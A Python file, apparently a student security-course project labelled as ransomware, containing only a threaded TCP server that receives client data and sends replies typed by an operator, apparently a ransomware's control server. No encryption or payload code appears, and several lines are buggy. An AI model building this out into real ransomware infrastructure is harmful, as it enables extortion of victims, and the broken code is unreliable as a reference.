# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
from threading import Thread
from socketserver import ThreadingMixIn
# --------------------------------------------
# CLasses
# --------------------------------------------
class customThread(Thread):
    def __init__(self, ip, port):
        Thread.__init__(self)
        self.ip = ip
        self.port = port
        print('[+] Nouveau thread démarré pour ' + ip + ":" + str(port))

    def run(self):
        msg = input('Entrer la réponse du serveur ou STOP pour sortir : ')
        while msg != "STOP":
            data = con.recv(2048)
            print(f'Le serveur a recu des données {data}')
            msg = input('Entrer la réponse du serveur ou STOP pour sortir : ')
            if msg == 'STOP':
                break
            con.send(bytes(msg, 'utf-8'))

# --------------------------------------------
# Functions
# --------------------------------------------


def check_packet_validity(header, message):
    """
    Protocole servant à contrôler la validité d'un packet en fonction de la taille de son header
    :param header: packet's header
    :type header: str
    :param message: packet's message
    :type message: str
    :return: True if packet is valid or False if not
    :rtype: bool
    """
    return message[9:9+header]

# --------------------------------------------
# Program
# --------------------------------------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SOCK_STREAM, 1)
s.bind(('', 8380))
threads = []

while True:
    s.listen(5)
    print("Serveur: en attente de connexions des clients TCP ...")
    (con, (ip, port)) = s.accept()
    mycustomThread = customThread(ip, port)
    mycustomThread.start()
    threads.append(mycustomThread)

for t in threads:
    t.join()

